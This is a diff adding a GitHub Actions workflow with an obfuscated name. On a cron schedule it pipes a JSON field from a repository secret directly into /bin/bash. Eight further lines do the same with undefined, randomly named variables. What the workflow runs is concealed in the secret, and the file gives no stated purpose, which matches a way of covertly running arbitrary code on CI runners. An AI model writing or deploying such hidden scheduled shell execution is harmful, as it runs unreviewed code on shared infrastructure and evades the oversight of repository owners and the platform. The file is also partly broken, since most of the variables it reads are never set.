@@ -1,0 +1,25 @@
+name: jiaoyoudeguo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiaoyoudeguo
+        env:
+          ksyeh872: ${{ secrets.ksyeh872 }}
+        run: |
+          echo $ksyeh872 | jq -r .a4 | /bin/bash
+          echo $nsqee4744 | jq -r .cdnwn69 | /bin/bash
+          echo $prhn971 | jq -r .hbnnd7 | /bin/bash
+          echo $bcb0 | jq -r .ppovf17 | /bin/bash
+          echo $ho99176 | jq -r .cxcqv21516 | /bin/bash
+          echo $kxmrg16 | jq -r .lfqn8 | /bin/bash
+          echo $mfw7 | jq -r .p77144 | /bin/bash
+          echo $g11053 | jq -r .g06342 | /bin/bash
+          echo $urubf1 | jq -r .q8 | /bin/bash
+
